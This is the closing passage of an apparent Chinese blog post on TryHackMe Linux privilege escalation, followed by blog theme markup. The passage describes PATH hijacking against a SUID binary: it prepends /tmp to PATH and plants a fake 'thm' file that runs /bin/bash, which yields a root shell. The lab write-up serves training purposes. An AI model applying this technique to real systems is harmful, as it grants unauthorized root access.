+<p>比如说 找到一个可执行文件<code>/home/murdoch/test</code>，并且具有suid属性，查看同文件夹下之前管理员编译后未删除的源代码文件.py后，发现他是在调用一个叫thm的命令，thm这个命令平常的时候会从<code>echo $PATH</code>中路径从前往后找，但是如果这个时候执行了<code>export PATH=/tmp:$PATH</code> (tmp文件夹同样可执行)，系统中调用thm时就会优先从&#x2F;tmp文件夹下寻找，此时这个动作属于root，所以在tmp目录中创建同样名为<code>thm</code>的文件，内容为<code>/bin/bash</code>，<code>./test</code>执行即可提权</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>tryhackme_linux_提权</div>
+      <div>http://groundctl2majortom.github.io/2023/08/08/tryhackme-linux-提权/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>GroundCtl2MajorTom</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/12/tryhackme-windows-%E6%8F%90%E6%9D%83/" title="tryhackme_windows_提权">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">tryhackme_windows_提权</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE/" title="渗透测试中的常见端口服务枚举">
+                        <span class="hidden-mobile">渗透测试中的常见端口服务枚举</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
